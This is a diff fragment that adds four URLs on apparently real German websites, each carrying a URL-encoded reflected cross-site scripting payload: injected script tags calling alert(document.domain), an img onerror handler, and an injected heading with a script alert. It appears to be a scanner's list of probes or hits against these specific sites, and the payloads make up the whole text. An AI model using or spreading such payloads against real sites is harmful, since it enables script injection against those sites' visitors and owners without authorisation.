@@ -1,0 +1,4 @@
+http://australien-erlebnisreisen.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://australien-studienreisen.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://autodiscover.hk-mueller.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://autojet.de/cgi-bin/manlist?section=%22%3E%3Ch1%3Ehello%3C%2Fh1%3E%3Cscript%3Ealert(/2UUmTA5Zkre6285PmAdvdlK8DMV/)%3C%2Fscript%3E
